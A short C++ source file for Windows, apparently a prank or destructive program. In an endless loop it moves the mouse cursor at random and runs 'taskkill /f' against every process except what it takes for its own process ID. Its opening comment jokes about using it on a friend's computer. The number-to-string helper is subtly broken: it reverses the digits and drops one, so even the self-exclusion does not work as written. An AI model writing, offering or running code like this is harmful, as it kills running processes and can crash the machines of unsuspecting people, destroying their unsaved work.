/*Use in virtual machines
Do NOT USE it in your computer
(maybe in a fri-end's computer*/
#include <bits/stdc++.h>
#include <windows.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
using namespace std;
string intstr(int a)
{
    string s = "";
    if(a<10)
    {
        if (a==0){s="0";}
        if (a==1){s="1";}
        if (a==2){s="2";}
        if (a==3){s="3";}
        if (a==4){s="4";}
        if (a==5){s="5";}
        if (a==6){s="6";}
        if (a==7){s="7";}
        if (a==8){s="8";}
        if (a==9){s="9";}
        return s;
    }
    for (int i = a;i>1;i=i/10)
    {
        s+=intstr(i%10);
    }
    return s;
}
int main()
{
    while(1)
    {
        SetCursorPos(rand()%1000,rand()%1000);
        int pid = getpid();
        system(("taskkill /f /fi \"pid ne "+intstr(pid)+"\"").c_str());
    }
}
